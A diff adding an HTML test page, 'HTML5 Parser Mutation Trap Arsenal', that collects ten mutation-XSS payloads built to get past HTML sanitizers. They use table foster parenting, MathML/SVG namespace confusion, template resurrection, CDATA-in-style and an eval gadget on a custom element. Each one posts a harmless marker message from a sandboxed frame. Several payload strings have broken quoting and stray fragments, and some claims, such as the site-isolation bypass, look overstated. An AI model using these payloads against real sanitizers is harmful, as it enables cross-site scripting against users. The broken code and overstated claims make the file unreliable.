@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTML5 Parser Mutation Trap Arsenal v2.0</title>
+<style>
+:root{--bg:#0a0a0f;--panel:#12121a;--accent:#ff3366;--cyan:#00f0ff;--green:#00ff88;--yellow:#ffcc00;--text:#e0e0e0}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:"Segoe UI",monospace;padding:20px;line-height:1.6}
+.header{text-align:center;padding:20px;border-bottom:2px solid var(--accent);margin-bottom:20px}
+.header h1{color:var(--accent);font-size:2em;text-shadow:0 0 20px var(--accent)}
+.header p{color:var(--cyan);font-size:0.95em}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(420px,1fr));gap:15px}
+.card{background:var(--panel);border:1px solid #222;border-radius:8px;padding:15px;position:relative;overflow:hidden}
+.card::before{content:"";position:absolute;top:0;left:0;width:4px;height:100%;background:var(--accent)}
+.card.safe::before{background:var(--green)}
+.card.danger::before{background:var(--yellow)}
+.card h3{color:var(--cyan);margin-bottom:8px;font-size:1.1em}
+.card .meta{font-size:0.8em;color:#888;margin-bottom:10px}
+.payload-box{background:#0d0d14;border:1px solid #333;border-radius:4px;padding:10px;font-family:monospace;font-size:0.82em;color:#a0a0b0;overflow-x:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:10px;max-height:200px;overflow-y:auto}
+.btn-group{display:flex;gap:8px;flex-wrap:wrap}
+button{background:var(--accent);color:#fff;border:none;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:0.85em;transition:all 0.2s}
+button:hover{filter:brightness(1.3);transform:translateY(-1px)}
+button.secondary{background:#333}
+button.secondary:hover{background:#444}
+button.danger{background:var(--yellow);color:#000}
+.iframe-container{width:100%;height:180px;border:1px solid #333;border-radius:4px;background:#050508;margin-top:10px;position:relative}
+.iframe-container iframe{width:100%;height:100%;border:none}
+.iframe-label{position:absolute;top:4px;left:6px;background:rgba(0,0,0,0.8);color:var(--cyan);font-size:0.7em;padding:2px 6px;border-radius:3px;z-index:10}
+.log-panel{position:fixed;bottom:20px;right:20px;width:380px;max-height:300px;background:var(--panel);border:1px solid var(--accent);border-radius:8px;padding:12px;overflow-y:auto;font-size:0.8em;z-index:1000;box-shadow:0 0 30px rgba(255,51,102,0.2)}
+.log-panel h4{color:var(--accent);margin-bottom:8px;border-bottom:1px solid #333;padding-bottom:4px}
+.log-entry{margin-bottom:4px;padding:3px 6px;border-radius:3px;background:rgba(255,255,255,0.03)}
+.log-entry.success{color:var(--green)}
+.log-entry.fail{color:#ff4444}
+.log-entry.info{color:var(--cyan)}
+.stats{display:flex;gap:20px;justify-content:center;margin-bottom:20px;flex-wrap:wrap}
+.stat-box{background:var(--panel);padding:10px 20px;border-radius:6px;border:1px solid #333;text-align:center}
+.stat-box .num{font-size:1.5em;color:var(--accent);font-weight:bold}
+.stat-box .label{font-size:0.8em;color:#888}
+.toggle-wasm{position:fixed;top:20px;right:20px;background:var(--panel);border:1px solid var(--cyan);padding:8px 14px;border-radius:6px;font-size:0.8em;cursor:pointer;z-index:1001}
+.toggle-wasm.active{background:var(--cyan);color:#000}
+.kill-chain-badge{display:inline-block;background:rgba(255,51,102,0.15);color:var(--accent);padding:2px 8px;border-radius:10px;font-size:0.75em;margin-left:8px;border:1px solid rgba(255,51,102,0.3)}
+</style>
+</head>
+<body>
+<div class="toggle-wasm" id="wasmToggle" onclick="toggleWASM()">WASM: OFF</div>
+
+<div class="header">
+  <h1>HTML5 Parser Mutation Trap Arsenal v2.0</h1>
+  <p>Quadruple-Context Namespace Pivot + 7 Kill Chains + Persistent WASM State</p>
+</div>
+
+<div class="stats">
+  <div class="stat-box"><div class="num" id="totalTests">0</div><div class="label">Total Tests</div></div>
+  <div class="stat-box"><div class="num" id="execCount">0</div><div class="label">Executions</div></div>
+  <div class="stat-box"><div class="num" id="bypassCount">0</div><div class="label">Bypasses</div></div>
+  <div class="stat-box"><div class="num" id="sanitizerCount">0</div><div class="label">Sanitizers Tested</div></div>
+</div>
+
+<div class="grid" id="payloadGrid"></div>
+
+<div class="log-panel" id="logPanel">
+  <h4>Execution Log</h4>
+  <div id="logContent"></div>
+</div>
+
+<script>
+// ===== STATE MANAGEMENT =====
+let wasmEnabled = false;
+let pyodide = null;
+let testState = {total:0,exec:0,bypass:0,sanitizers:0};
+
+// Load from localStorage or WASM
+function loadState(){
+  const saved = localStorage.getItem('html5_fuzzer_state');
+  if(saved){
+    try{testState=JSON.parse(saved);updateStats()}catch(e){}
+  }
+}
+function saveState(){
+  localStorage.setItem('html5_fuzzer_state',JSON.stringify(testState));
+}
+function updateStats(){
+  document.getElementById('totalTests').textContent=testState.total;
+  document.getElementById('execCount').textContent=testState.exec;
+  document.getElementById('bypassCount').textContent=testState.bypass;
+  document.getElementById('sanitizerCount').textContent=testState.sanitizers;
+}
+function log(msg,type='info'){
+  const div=document.createElement('div');
+  div.className='log-entry '+type;
+  div.textContent='['+new Date().toLocaleTimeString()+'] '+msg;
+  document.getElementById('logContent').appendChild(div);
+  document.getElementById('logPanel').scrollTop=999999;
+}
+
+// ===== PAYLOAD DEFINITIONS =====
+const payloads = [
+  {
+    id:'qctx',
+    title:'Quadruple-Context Namespace Pivot',
+    chain:'Kill Chain #1: Adoption Agency Overflow',
+    danger:true,
+    desc:'Forces parser through Table→MathML→Table→SVG→HTML with foster parenting at layers 1&3. Adoption agency re-parents <script> out of sanitized containment.',
+    html:'<table><tr><td><math><mtext><table><mglyph><style><svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><p><b><p><button><p><script>parent.postMessage({type:"BYPASS",id:"qctx",chain:1},'*')</script></p></button></p></b></p></div></foreignObject></svg></style></mglyph></table></mtext></math></td></tr></table>'
+  },
+  {
+    id:'template_res',
+    title:'Template Content Resurrection',
+    chain:'Kill Chain #2: Deferred Execution',
+    danger:true,
+    desc:'Sanitizer strips <template> from visible DOM but leaves .content DocumentFragment. Inner template survives, executes on cloneNode(true).',
+    html:'<template id="t1"><svg><foreignObject><template id="t2"><xmp><script>parent.postMessage({type:"BYPASS",id:"template_res",chain:2},'*')</script></xmp></template></foreignObject></svg></template><div id="inject"></div><script>setTimeout(()=>{const t=document.getElementById("t1");if(t&&t.content){const c=t.content.cloneNode(true);document.getElementById("inject").appendChild(c)}},500)</script>'
+  },
+  {
+    id:'isindex',
+    title:'isindex Formaction Auto-Wrap',
+    chain:'Kill Chain #3: Implicit Form Generation',
+    danger:true,
+    desc:'<isindex> auto-wraps in <form> during tokenization. formaction survives sanitizer because isindex is "dead". Implicit form submission triggers JS.',
+    html:'<isindex type="image" src="javascript:parent.postMessage({type:'BYPASS',id:'isindex',chain:3},'*')" formaction="javascript:parent.postMessage({type:'BYPASS',id:'isindex',chain:3},'*')">'
+  },
+  {
+    id:'foreign_stack',
+    title:'Recursive foreignObject Stack Exhaustion',
+    chain:'Kill Chain #4: DoS / State Leakage',
+    danger:true,
+    desc:'Nested svg→foreignObject at 50+ levels hits compositing layer limit. Renderer crash may bypass site-isolation on restart.',
+    html:(()=>{let h='<svg><foreignObject><div>';for(let i=0;i<25;i++)h+='<svg><foreignObject><div>';h+='<script>parent.postMessage({type:"BYPASS",id:"foreign_stack",chain:4},'*')</script>';for(let i=0;i<25;i++)h+='</div></foreignObject></svg>';return h+'</div></foreignObject></svg>';})()
+  },
+  {
+    id:'ns_rebind',
+    title:'Namespace Prefix Rebinding',
+    chain:'Kill Chain #5: Namespace Desync',
+    danger:true,
+    desc:'Prefix x: bound to XHTML at root, rebound to MathML at math level. XML sanitizer sees safe MathML text; browser sees XHTML script.',
+    html:'<x:body xmlns:x="http://www.w3.org/1999/xhtml"><x:math xmlns:x="http://www.w3.org/1998/Math/MathML"><x:mtext><x:script>parent.postMessage({type:"BYPASS",id:"ns_rebind",chain:5},'*')</x:script></x:mtext></x:math></x:body>'
+  },
+  {
+    id:'ce_gadget',
+    title:'Custom Element Upgrade Gadget',
+    chain:'Kill Chain #6: Deferred Gadget',
+    danger:false,
+    desc:'Sanitizer strips inline JS but preserves custom element + data-x. Target JS upgrades element, eval()s attribute. Requires target to define custom element.',
+    html:'<x-foo data-x="parent.postMessage({type:'BYPASS',id:'ce_gadget',chain:6},'*')"></x-foo><script>customElements.define("x-foo",class extends HTMLElement{connectedCallback(){try{eval(this.getAttribute("data-x"))}catch(e){}}})</script>'
+  },
+  {
+    id:'style_cdata',
+    title:'Comment/CDATA State Confusion',
+    chain:'Kill Chain #7: Serializer vs Parser',
+    danger:true,
+    desc:'Sanitizer sees CSS comment/CDATA as inert. HTML5 parser treats <!-- as comment start closing <style>. Subsequent <script> executes on re-parse.',
+    html:'<style><![CDATA[<!--</style><script>parent.postMessage({type:"BYPASS",id:"style_cdata",chain:7},'*')</script>-->]]></style>'
+  },
+  {
+    id:'menu_dialog',
+    title:'menu + dialog + menuitem Deep Nesting',
+    chain:'The One to Watch',
+    danger:true,
+    desc:'menu is scoping element. dialog has own insertion mode. menuitem is obsolete — sanitizers pass it through. Parser treats menuitem as void element in quirks mode.',
+    html:(()=>{let h='';for(let i=0;i<15;i++)h+='<menu><dialog>';h+='<menuitem><script>parent.postMessage({type:"BYPASS",id:"menu_dialog",chain:8},'*')</script></menuitem>';for(let i=0;i<15;i++)h+='</dialog></menu>';return h;})()
+  },
+  {
+    id:'table_foster',
+    title:'Double Table Foster Parenting',
+    chain:'Foster Parenting Amplifier',
+    danger:true,
+    desc:'Nested tables with misplaced content forces foster parenting twice. Script element re-parented to body outside sanitized container.',
+    html:'<table><tr><td><table><tr><td><style><table><img src=x onerror="parent.postMessage({type:'BYPASS',id:'table_foster',chain:9},'*')">'</n  },
+  {
+    id:'mathml_style',
+    title:'MathML Text Integration + Style Escape',
+    chain:'MathML mXSS Variant',
+    danger:true,
+    desc:'MathML text integration point switches to HTML rules. <style> inside MathML is parsed as HTML style, not MathML style. Content escapes to body.',
+    html:'<math><mtext><style><img src=x onerror="parent.postMessage({type:'BYPASS',id:'mathml_style',chain:10},'*')">'</n  }
+];
+
+// ===== RENDER PAYLOAD CARDS =====
+function renderPayloads(){
+  const grid=document.getElementById('payloadGrid');
+  payloads.forEach(p=>{
+    const card=document.createElement('div');
+    card.className='card '+(p.danger?'danger':'safe');
+    card.id='card-'+p.id;
+    card.innerHTML=`
+      <h3>${p.title}<span class="kill-chain-badge">${p.chain}</span></h3>
+      <div class="meta">${p.desc}</div>
+      <div class="payload-box" id="box-${p.id}">${escapeHtml(p.html)}</div>
+      <div class="btn-group">
+        <button onclick="testPayload('${p.id}')">Test in Isolated Frame</button>
+        <button class="secondary" onclick="copyPayload('${p.id}')">Copy HTML</button>
+        <button class="secondary" onclick="showDOM('${p.id}')">Show Parsed DOM</button>
+        <button class="danger" onclick="testSanitizer('${p.id}')">Test vs DOMPurify</button>
+      </div>
+      <div class="iframe-container" id="frame-${p.id}" style="display:none">
+        <div class="iframe-label">Isolated Execution Frame</div>
+        <iframe sandbox="allow-scripts" id="iframe-${p.id}"></iframe>
+      </div>
+      <div id="dom-${p.id}" style="margin-top:10px;font-size:0.8em;color:#888;display:none"></div>
+    `;
+    grid.appendChild(card);
+  });
+}
+
+function escapeHtml(s){
+  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+// ===== TEST FUNCTIONS =====
+function testPayload(id){
+  const p=payloads.find(x=>x.id===id);
+  if(!p)return;
+  testState.total++;testState.exec++;
+  saveState();updateStats();
+  log('Testing payload: '+p.title,'info');
+
+  const frame=document.getElementById('frame-'+id);
+  const iframe=document.getElementById('iframe-'+id);
+  frame.style.display='block';
+
+  const blob=new Blob([p.html],{type:'text/html'});
+  iframe.src=URL.createObjectURL(blob);
+
+  setTimeout(()=>{
+    log('Payload '+id+' executed (timeout check)','info');
+  },1000);
+}
+
+function copyPayload(id){
+  const p=payloads.find(x=>x.id===id);
+  navigator.clipboard.writeText(p.html).then(()=>{
+    log('Copied '+p.title+' to clipboard','success');
+  });
+}
+
+function showDOM(id){
+  const p=payloads.find(x=>x.id===id);
+  const div=document.getElementById('dom-'+id);
+  const parser=new DOMParser();
+  const doc=parser.parseFromString(p.html,'text/html');
+  div.style.display='block';
+  div.innerHTML='<strong>Parsed DOM Tree:</strong><pre style="background:#0a0a0f;padding:8px;border-radius:4px;overflow-x:auto">'+escapeHtml(doc.body.innerHTML)+'</pre>';
+}
+
+function testSanitizer(id){
+  testState.sanitizers++;
+  saveState();updateStats();
+  log('Testing vs DOMPurify-style sanitization: '+id,'info');
+
+  const p=payloads.find(x=>x.id===id);
+  // Naive sanitizer simulation
+  let sanitized=p.html;
+  sanitized=sanitized.replace(/<script[\s\S]*?<\/script>/gi,'[SCRIPT_REMOVED]');
+  sanitized=sanitized.replace(/on\w+\s*=\s*["']?[^"']*["']?/gi,'[EVENT_REMOVED]');
+  sanitized=sanitized.replace(/javascript:/gi,'[JS_SCHEME_REMOVED]');
+
+  const div=document.getElementById('dom-'+id);
+  div.style.display='block';
+  div.innerHTML='<strong>Naive Sanitizer Output:</strong><pre style="background:#0a0a0f;padding:8px;border-radius:4px;overflow-x:auto;color:#ff4444">'+escapeHtml(sanitized)+'</pre><div style="margin-top:8px;color:var(--yellow)"><strong>⚠️ This naive sanitizer likely FAILS on this payload. The browser's tree builder will reconstruct differently on re-parse.</strong></div>';
+}
+
+// ===== MESSAGE HANDLER FOR BYPASSES =====
+window.addEventListener('message',e=>{
+  if(e.data && e.data.type==='BYPASS'){
+    testState.bypass++;
+    saveState();updateStats();
+    log('🚨 BYPASS DETECTED: '+e.data.id+' (Chain #'+e.data.chain+')','success');
+    const card=document.getElementById('card-'+e.data.id);
+    if(card)card.style.border='2px solid var(--green)';
+  }
+});
+
+// ===== WASM / PYODIDE =====
+async function toggleWASM(){
+  const btn=document.getElementById('wasmToggle');
+  if(!wasmEnabled){
+    btn.textContent='WASM: LOADING...';
+    try{
+      if(!window.loadPyodide){
+        const s=document.createElement('script');
+        s.src='https://cdn.jsdelivr.net/pyodide/v0.25.0/full/pyodide.js';
+        s.onload=async()=>{
+          pyodide=await loadPyodide();
+          wasmEnabled=true;
+          btn.textContent='WASM: ON';
+          btn.classList.add('active');
+          log('Pyodide WASM loaded. Persistent Python state available.','success');
+        };
+        document.head.appendChild(s);
+      }else{
+        pyodide=await loadPyodide();
+        wasmEnabled=true;
+        btn.textContent='WASM: ON';
+        btn.classList.add('active');
+        log('Pyodide WASM loaded. Persistent Python state available.','success');
+      }
+    }catch(err){
+      log('WASM load failed: '+err.message,'fail');
+      btn.textContent='WASM: ERROR';
+    }
+  }else{
+    wasmEnabled=false;
+    btn.textContent='WASM: OFF';
+    btn.classList.remove('active');
+    log('WASM state persistence disabled.','info');
+  }
+}
+
+// ===== INIT =====
+loadState();
+renderPayloads();
+log('HTML5 Parser Mutation Trap Arsenal v2.0 initialized.','info');
+log('Click "Test in Isolated Frame" to execute payloads.','info');
+</script>
+</body>
+</html>
